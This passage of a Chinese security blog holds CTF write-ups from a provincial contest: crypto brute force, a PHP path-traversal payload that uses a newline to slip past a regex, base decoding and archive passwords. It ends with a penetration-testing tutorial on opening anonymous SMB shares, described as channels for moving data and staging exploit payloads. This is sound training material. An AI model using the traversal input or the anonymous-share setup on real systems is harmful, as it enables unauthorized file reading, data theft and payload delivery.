<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token hashbang comment">#!/usr/bin/env sage</span></pre></td></tr><tr><td data-num="2"></td><td><pre># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> <span class="token constant">SHA3_256</span></pre></td></tr><tr><td data-num="4"></td><td><pre>from Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> <span class="token constant">AES</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="6"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> unpad</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token constant">N</span> <span class="token operator">=</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="9"></td><td><pre>p <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="10"></td><td><pre>q <span class="token operator">=</span> <span class="token number">512</span></pre></td></tr><tr><td data-num="11"></td><td><pre>d <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> <span class="token constant">ZZ</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>c <span class="token operator">=</span> b<span class="token string">'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                    <span class="token keyword">for</span> i6 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                        <span class="token keyword">for</span> i7 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                            <span class="token keyword">for</span> i8 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                                <span class="token keyword">for</span> i9 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                                    <span class="token keyword">for</span> i10 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                                        result <span class="token operator">=</span> <span class="token punctuation">[</span>i1<span class="token punctuation">,</span> i2<span class="token punctuation">,</span> i3<span class="token punctuation">,</span> i4<span class="token punctuation">,</span> i5<span class="token punctuation">,</span> i6<span class="token punctuation">,</span> i7<span class="token punctuation">,</span> i8<span class="token punctuation">,</span> i9<span class="token punctuation">,</span> i10<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                                        m <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                                        sha3 <span class="token operator">=</span> <span class="token constant">SHA3_256</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                                        key <span class="token operator">=</span> sha3<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                                        dypher <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token constant">MODE_ECB</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                                        <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                                            flag <span class="token operator">=</span> <span class="token function">unpad</span><span class="token punctuation">(</span>dypher<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                                            <span class="token keyword">if</span> flag<span class="token punctuation">.</span><span class="token function">startswith</span><span class="token punctuation">(</span>b<span class="token string">'flag'</span><span class="token punctuation">)</span> or flag<span class="token punctuation">.</span><span class="token function">startswith</span><span class="token punctuation">(</span>b<span class="token string">'DASCTF'</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                                                <span class="token function">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                                                sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                                        <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                                            pass</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>                                            </pre></td></tr><tr><td data-num="42"></td><td><pre>                                            </pre></td></tr><tr><td data-num="43"></td><td><pre>#b<span class="token string">'DASCTF&#123;b437acf4-aaf8-4f8f-ad84-5b1824f5af9c&#125;'</span></pre></td></tr></table></figure><p>运行得到 flag：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211110151834879-818252468.png" alt="" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly80eHdpMTEuZ2l0aHViLmlvL3Bvc3RzLzJlNTE2Njg0Lw==">本文参考 4WXi11 佬的省赛 WP</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届浙江省网络安全技能竞赛决赛部分WP</title>
    <url>/article/8d4c4fc4.html</url>
    <content><![CDATA[<p><strong>emmmmm, 暴打出题人，预赛和决赛就只会签到 QAQ！！！</strong></p>
<p>&lt;h2/&gt;Web&lt;/h2&gt;</p>
<p>&lt;h3/&gt; 远古特性 &lt;/h3&gt;</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Present from glzjin :)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^hint\/hint.txt$/m'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try again!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">Try</span> again<span class="token operator">!</span></span></pre></td></tr></table></figure><p>php 代码审计，正则表达式提示输入的参数得有 <code>hint/hint.txt</code>  才能成功。</p>
<p>因为正则表达式 /m 要换多行匹配，所以需要换行符；第一行通过第二行执行正则指令，换行符为 <code>%0A</code> 。</p>
<p>所以输入 <code>?file=hint/hint.txt%0A../../../../../flag</code>  得到提示：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>Warning<span class="token punctuation">:</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>hint<span class="token operator">/</span>hint<span class="token operator">.</span>txt <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">failed</span> to open stream<span class="token punctuation">:</span> No such file <span class="token keyword">or</span> directory in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">10</span></pre></td></tr></table></figure><p>表示文件未找到，继续加 <code>../</code> , 得到 flag：<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101172743483-1829736796.png" alt="" /></p>
<p>&lt;h2/&gt;RE&lt;/h2&gt;</p>
<p>&lt;h3/&gt; 最简单的逆向 &lt;/h3&gt;</p>
<p>附件 ida 打开， <code>f5</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101172816940-1230999737.png" alt="" /></p>
<p>找到 for 循环后双击 enc 得到</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101172841259-1429092771.png" alt="" /></p>
<p>将 enc 进行对比：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token literal-property property">enc</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag：<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101172904036-1597899665.png" alt="" /></p>
<p>&lt;h2/&gt;Crypto&lt;/h2&gt;</p>
<p>&lt;h3/&gt;decode_and_decode&lt;/h3&gt;</p>
<p>附件下载<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101172920368-1040902370.png" alt="" /></p>
<p>得到一堆 base 密文，根据题目提示一直解码试试，开始一直用工具在解密发现是 base 循环加密，脚本贴上</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">with</span> <span class="token function">open</span><span class="token punctuation">(</span>r<span class="token string">'decode_and_decode的附件22.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token literal-property property">f</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token literal-property property">f</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                a <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>                pass</pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                a <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b32decode</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                pass</pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                a <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b16decode</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                pass</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"&#123;"</span> <span class="token keyword">in</span> <span class="token literal-property property">a</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                <span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr></table></figure><p>得到 flag：<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101172946180-777354654.png" alt="" /></p>
<p>&lt;h2/&gt;MISC&lt;/h2&gt;</p>
<p>&lt;h3/&gt;site_log&lt;/h3&gt;</p>
<p>附件下载得到：<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101173004885-1353201518.png" alt="" /></p>
<p>打开日志文件可以发现 attack 字样后有 chr 字符读取字样，将所有 chr 读取字符转换得到<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101173026723-9283991.png" alt="" /></p>
<p>一连串命令行，不难发现解压密码为</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>hehehe233_Igotroot！</pre></td></tr></table></figure><p>用 <code>WinRAR</code>  解压得到 flag：<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101173047604-1999636297.png" alt="" /></p>
<p>&lt;h3/&gt;asoul_lover&lt;/h3&gt;</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>最近我旁边的灏妹天天上班第一句就是“Avaava”，还说要当安恒第一顶碗人。在他桌面上似乎发现了一个好康的压缩文件，想想他之前用过自己的名字<span class="token operator">+</span>生日来做压缩密码，这把应该也能破解出来咯？对咯，他的压缩软件支持中文密码。flag的格式为 <span class="token constant">DASCTF</span><span class="token punctuation">&#123;</span>xxxxxx<span class="token punctuation">&#125;</span>，提交时只需要提交括号内的字符串。</pre></td></tr></table></figure><p>文件信息结合附件可以找到压缩包密码为：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101173116603-1242333172.png" alt="" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>向晚<span class="token number">0612</span></pre></td></tr></table></figure><p>得到 flag:</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211101173127023-1847943792.png" alt="" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透技巧——通过命令行开启Windows系统的匿名访问共享</title>
    <url>/article/4a3c5201.html</url>
    <content><![CDATA[<p>纪念一下今天圈子里提前过大年了！！！dddd，But 渗透依旧不能停啊！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210191626091.png" alt="image-20211210191626091" /></p>
<h2 id="00x00-前言"><a class="anchor" href="#00x00-前言">#</a> 00x00 前言</h2>
<p>在渗透测试中，尤其是内网渗透，通常需要在内网开启一个支持匿名访问的文件共享，配合漏洞利用。</p>
<p>所以需要一种通用的方法，不仅要使用便捷，还要能够在命令行下运行。</p>
<p>这里通过 <code>win7</code>  进行实验。</p>
<h2 id="00x01-利用场景"><a class="anchor" href="#00x01-利用场景">#</a> 00x01 利用场景</h2>
<p>开启支持匿名访问的文件共享后，其他用户不需要输入用户名和口令，可以直接访问文件服务器的共享文件</p>
<p>通常有以下两种用法：</p>
<ol>
<li>作为数据传输的通道</li>
<li>配合漏洞利用，作为 Payload 的下载地址</li>
</ol>
<p>文件共享服务器需要能够在不同操作系统上搭建</p>
<p>对于 <code>Linux</code>  系统，可借助 <code>Samba</code>  服务搭建可匿名访问的文件共享服务器</p>
<p>这里给出 <code>Kali</code>  系统下的使用方法：</p>
<p>修改文件 <code>/etc/samba/smb.conf</code> ，内容如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span>global<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    map to guest <span class="token operator">=</span> test1</pre></td></tr><tr><td data-num="3"></td><td><pre>    server role <span class="token operator">=</span> standalone server</pre></td></tr><tr><td data-num="4"></td><td><pre>    usershare allow guests <span class="token operator">=</span> yes</pre></td></tr><tr><td data-num="5"></td><td><pre>    idmap config <span class="token operator">*</span> <span class="token operator">:</span> backend <span class="token operator">=</span> tdb</pre></td></tr><tr><td data-num="6"></td><td><pre>    smb ports <span class="token operator">=</span> <span class="token number">445</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span>smb<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    comment <span class="token operator">=</span> Samba</pre></td></tr><tr><td data-num="10"></td><td><pre>    path <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">tmp</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    guest ok <span class="token operator">=</span> yes</pre></td></tr><tr><td data-num="12"></td><td><pre>    read only <span class="token operator">=</span> no</pre></td></tr><tr><td data-num="13"></td><td><pre>    browsable <span class="token operator">=</span> yes</pre></td></tr></table></figure><p>开启服务：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>service smbd start </pre></td></tr><tr><td data-num="2"></td><td><pre>service nmbd start</pre></td></tr></table></figure><p>对于 <code>Windows</code>  系统，则需要考虑域环境和工作组环境。同时为了支持匿名访问，还需要开启 <code>Guest</code>  用户，允许 <code>Guest</code>  用户访问文件共享服务器的内容。</p>
<h2 id="00x02-通过界面开启可匿名访问的文件共享服务器"><a class="anchor" href="#00x02-通过界面开启可匿名访问的文件共享服务器">#</a> 00x02 通过界面开启可匿名访问的文件共享服务器</h2>
<h3 id="1启用guest用户"><a class="anchor" href="#1启用guest用户">#</a> 1. 启用 Guest 用户</h3>
<p><code>win+r</code>  打开运行窗口，运行 <code>gpedit.msc</code> ，打开组策略</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210192543319.png" alt="image-20211210192543319" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210192647745.png" alt="image-20211210192647745" /></p>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;Security Options</code> ，也即：计算机配置 -&gt; <code>Windows</code>  设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210192850285.png" alt="image-20211210192850285" /></p>
<p>选择策略 <code>Accounts: Guest account status</code> ，设置为 <code>Enabled</code> ，即修改 “帐户：来宾帐户状态” 为 “禁止”。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210193010453.png" alt="image-20211210193010453" /></p>
<h3 id="2将everyone权限应用于匿名用户"><a class="anchor" href="#2将everyone权限应用于匿名用户">#</a> 2. 将 Everyone 权限应用于匿名用户</h3>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;Security Options</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210192850285.png" alt="image-20211210192850285" /></p>
<p>选择策略 <code>Network access:Let Everyone permissions apply to anonymous users</code> ，设置为 <code>Enabled</code> ，即修改 “网络访问：将 <code>Everyone</code>  权限应用于匿名用户” 为 “禁止”，一般默认为禁用状态。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210194001996.png" alt="image-20211210194001996" /></p>
<h3 id="3指定匿名共享文件的位置"><a class="anchor" href="#3指定匿名共享文件的位置">#</a> 3. 指定匿名共享文件的位置</h3>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;Security Options</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210192850285.png" alt="image-20211210192850285" /></p>
<p>选择策略 <code>Network access:Shares that can be accessed anonymously</code> ，设置名称，这里可以填入 <code>smb</code> ，即修改 “网络访问：可匿名访问的共享” 的名称为： <code>smb</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210195532578.png" alt="image-20211210195532578" /></p>
<h3 id="4将guest用户从策略拒绝从网络访问这台计算机中移除"><a class="anchor" href="#4将guest用户从策略拒绝从网络访问这台计算机中移除">#</a> 4. 将 Guest 用户从策略 “拒绝从网络访问这台计算机” 中移除</h3>
<p>位置： <code>Computer Configuration-&gt;Windows Settings-&gt;Security Settings-&gt;Local Policies-&gt;User Rights Assignment</code> ，也即：计算机配置 -&gt; <code>Windows</code>  设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 用户权限分配</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210195714536.png" alt="image-20211210195714536" /></p>
<p>选择策略 <code>Deny access to this computer from the network</code> ，即从 “拒绝从网络访问此计算机” 中，移除用户 <code>Guest</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210195833961.png" alt="image-20211210195833961" /></p>
<h3 id="5设置文件共享"><a class="anchor" href="#5设置文件共享">#</a> 5. 设置文件共享</h3>
<p>新建一个共享的文件夹名为 <code>smb</code> ，右键打开 “属性”，进入 “共享” 页面设置高级共享，共享名为 <code>smb</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210200155897.png" alt="image-20211210200155897" /></p>
<p>共享权限组或用户名为 <code>Everyone</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210200220448.png" alt="image-20211210200220448" /></p>
<p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为 <code>//&lt;ip&gt;/smb</code></p>
